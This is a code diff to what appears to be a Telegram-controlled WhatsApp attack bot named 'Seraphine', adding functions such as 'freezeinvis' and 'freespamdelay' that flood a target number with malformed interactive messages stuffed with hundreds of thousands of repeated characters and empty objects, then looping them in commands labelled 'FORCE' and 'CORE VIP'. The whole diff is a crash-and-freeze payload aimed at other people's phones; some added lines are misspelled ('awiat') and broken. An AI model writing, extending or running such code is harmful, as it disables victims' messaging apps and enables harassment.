@@ -3119,7 +3119,25 @@ async function LexcaabosV5(target) {
         }
     }, { participant: target });
 }
-
+async function freezeinvis(target) {
+  while (Date.now() - Date.now() < 100000) {
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: {
+          interactiveMessage: {
+            body: {
+              text: "!Sseraphhnieee"
+            }, 
+            nativeFlowMessage: {
+              buttons: "{".repeat(500000)
+            }
+          }
+        }
+      }
+    }, { noSyncSelf: true });
+    await new Promise((r) => setTimeout(r, 2000));
+  }
+}
 async function iosswipper(target) {
 const a = " fvck sereη. " + "𑇂𑆵𑆴𑆿".repeat(70000); 
 const b = "𑇂𑆵𑆴𑆿".repeat(70000);
@@ -3730,7 +3748,151 @@ async function ForcloseSTC(target) {
         }
     }
 }
+async function freespamdelay(target) {
+    const a = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: " - zephyrinē tukang maling ",
+                        footer: "\u0250"
+                    },
+                    nativeFlowMessage: {
+                        buttons: "x".repeat(40000),
+                        nativeFlowResponseMessage: {
+                            buttons: Array.from({ length: 1236 }, () => ({}))
+                        }
+                    },
+                    nativeFlowInfo: {
+                        name: "single_select",
+                        paramsJson: JSON.stringify({
+                            icon: "document",
+                            title: " - zephyrinē tukang maling ",
+                            sections: Array.from({ length: 5055 }, () => ({}))
+                        })
+                    }
+                }
+            }
+        }
+    };
 
+    const b = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    header: {
+                        title: " - zephyrinē tukang maling "
+                    },
+                    body: {
+                        text: "[{".repeat(1000) + "}]".repeat(1000)
+                    },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: 500000 }, () => ({}))
+                    }
+                }
+            }
+        }
+    };
+
+    const c = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: "\u0000".repeat(30000) + "\u3164".repeat(30000) + "\uFDFD".repeat(30000)
+                    },
+                    messageParamsJson: "\uFDFD".repeat(50000),
+                    contextInfo: {
+                        mentionedJid: Array.from({ length: 1000 }, function() {
+                            return Math.floor(Math.random() * 100000) + "@s.whatsapp.net";
+                        }),
+                        isForwarded: true,
+                        forwardingScore: 9999
+                    }
+                }
+            }
+        }
+    };
+
+    const d = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveResponseMessage: {
+                    body: {
+                        text: " - zephyrinē tukang maling ",
+                        format: "DEFAULT"
+                    },
+                    nativeFlowResponseMessage: {
+                        name: "catalog_message",
+                        paramsJson: "\u200B".repeat(1045000),
+                        version: 3
+                    }
+                }
+            }
+        }
+    };
+
+    const e = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: " - zephyrinē tukang maling "
+                    },
+                    nativeFlowMessage: {
+                        buttons: "\x10".repeat(200000)
+                    }
+                }
+            }
+        }
+    };
+
+    const f = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: " - zephyrinē tukang maling "
+                    },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: 500000 }, () => ({}))
+                    }
+                }
+            }
+        }
+    };
+
+    const g = {
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: {
+                        text: " - zephyrinē tukang maling "
+                    },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: 100000 }, () => ({}))
+                    }
+                }
+            }
+        }
+    };
+
+    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+    for (let i = 0; i < 30; i++) {
+        await sock.relayMessage(target, a, { noSelfSync: true });
+        await sock.relayMessage(target, b, { noSelfSync: true });
+        await sock.relayMessage(target, c, { noSelfSync: true });
+        await sock.relayMessage(target, d, { noSelfSync: true });
+        await sock.relayMessage(target, e, { noSelfSync: true });
+        await sock.relayMessage(target, f, { noSelfSync: true });
+        await sock.relayMessage(target, g, { noSelfSync: true });
+
+        if ((i + 1) % 5 === 0) {
+            await delay(3000);
+        }
+    }
+}
 //=========== ASYNC FUNCTION SEND ==========\\
 async function crayxkouta(target) {
 for (let i = 0; i < 50; i++) {
@@ -3777,12 +3939,17 @@ async function crayxios(inviteCode) {
 async function crayxui(target) {
 for (let i = 0; i < 25; i++) {
 await starttime(target)
-await new Promise(resolve => setTimeout(resolve, 2500));
 await ForcloseSTC(target)
-await new Promise(resolve => setTimeout(resolve, 2500));
 await ForcloseVIDEO(target)
-await new Promise(resolve => setTimeout(resolve, 2500));
 await ForcloseDOC(target)
+await freezeinvis(target)
+await ForcloseDOC(target)
+awiat freezeinvis(target)
+await starttime(target)
+await ForcloseSTC(target)
+await ForcloseVIDEO(target)
+await freezeinvis(target)
+await freespamdelay(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 }
@@ -3790,8 +3957,12 @@ console.log(chalk.red(`[Seraphine - FORCE 🦠 ] ${target}`));
 
 async function crayxsuper(target) {
 for (let i = 0; i < 70; i++) {
-await LexcaabosV5(target)
-await LexcaabosV4(target)
+await freezeinvis(target)
+await freespamdelay(target)
+await freezeinvis(target)
+await freespamdelay(target)
+await freezeinvis(target)
+await freespamdelay(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 }
@@ -3801,9 +3972,19 @@ console.log(chalk.red(`[Seraphine - CORE VIP 🔥 ] ${target}`));
 async function crayxvol(target) {
 for (let i = 0; i < 30; i++) {
 await ForcloseDOC(target)
+awiat freezeinvis(target)
 await starttime(target)
 await ForcloseSTC(target)
 await ForcloseVIDEO(target)
+await freezeinvis(target)
+await freespamdelay(target)
+await ForcloseDOC(target)
+awiat freezeinvis(target)
+await starttime(target)
+await ForcloseSTC(target)
+await ForcloseVIDEO(target)
+await freezeinvis(target)
+await freespamdelay(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 }
@@ -3811,9 +3992,14 @@ console.log(chalk.red(`[Seraphine - TRASH 🍃 ] ${target}`));
 
 async function Crayxbayar(target) {
 for (let i = 0; i < 50; i++) {
-await LexcaabosV3(target)
-await LexcaabosV5(target)
-await LexcaabosV4(target)
+await freezeinvis(target)
+await freespamdelay(target)
+await freezeinvis(target)
+await freespamdelay(target)
+await freezeinvis(target)
+await freespamdelay(target)
+await freezeinvis(target)
+await freespamdelay(target)
 await new Promise(resolve => setTimeout(resolve, 2500));
 console.log(chalk.red(`[Seraphine - MEMEK ] ${target}`));
 }
@@ -4179,7 +4365,6 @@ ${hasil}
 ┃❏ /deladmin <ɪᴅ>
 ┃❏ /addvipgb <ɪᴅ> 30d
 ┃❏ /cekid
-┃❏ /tourl
 ╰━───────────────━❏
 \`\`\``;
       replyMarkup = {
